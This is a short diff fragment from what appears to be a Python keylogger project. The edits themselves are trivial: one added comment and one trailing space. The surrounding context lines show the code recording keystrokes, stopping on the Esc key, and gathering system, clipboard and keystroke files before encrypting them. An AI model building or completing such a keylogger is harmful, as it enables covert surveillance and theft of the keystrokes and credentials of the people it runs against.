@@ -116,7 +116,7 @@ def write_file(keys):
             elif k.find("Key") == -1:
                 f.write(k)
 
-
+#starting the keylogger
 def on_release(key):
     if key == Key.esc:
         return False
@@ -134,7 +134,7 @@ if currentTime > stopping_time:
 
     currentTime = time.time()
     stopping_time = time.time() + time_iteration
-# Encrypting the files
+# Encrypting the files 
 files_to_encrypt = [file_merge + system_information, file_merge + clipboard_information, file_merge + keys_information]
 encrypted_file_names = [file_merge + system_information_e, file_merge + clipboard_information_e, file_merge + keys_information_e]
 
